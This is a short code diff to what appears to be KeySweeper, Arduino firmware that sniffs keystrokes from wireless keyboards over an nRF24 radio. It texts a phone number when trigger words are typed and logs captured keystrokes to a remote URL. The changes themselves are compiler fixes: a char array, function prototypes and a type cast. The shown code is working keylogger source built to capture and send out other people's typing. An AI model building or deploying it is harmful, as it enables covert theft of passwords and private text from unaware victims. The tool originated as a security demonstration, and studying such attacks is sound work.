@@ -71,7 +71,7 @@
 //#define ENABLE_GSM
 
 // number to send sms to upon trigger words (only if ENABLE_GSM is defined)
-char *SMSnumber = "3105551212";
+char SMSnumber[] = "3105551212";
 
 // log online to this url (only if ENABLE_GSM is defined)
 #define URL "samy.pl/keysweeper/log.php?"
@@ -210,6 +210,12 @@ uint64_t kbPipe = 0xAALL; // will change, but we use 0xAA to sniff
 // calc'ing checksum and xor'ing with actual checksums
 uint8_t cksum_idle_offset = 0xFF;
 uint8_t cksum_key_offset  = ~(kbPipe >> 8 & 0xFF);
+
+// declare function prototypes to make compiler happy
+void sendSms(uint8_t);
+void storeKeystroke(char);
+boolean post_http(char);
+void sendKeystroke(char);
 
 RF24 radio(CE, CSN);
 
@@ -631,7 +637,7 @@ void loop(void)
 
     // keypress?
     // we will see multiple of the same packets, so verify sequence is different
-    if (p[0] == 0x0a && p[1] == 0x78 && p[9] != 0 && lastSeq != (p[5] << 8) + p[4])
+    if (p[0] == 0x0a && p[1] == 0x78 && p[9] != 0 && lastSeq != (uint16_t)((p[5] << 8) + p[4]))
     {
       lastSeq = (p[5] << 8) + p[4];
       ch = gotKeystroke(p);
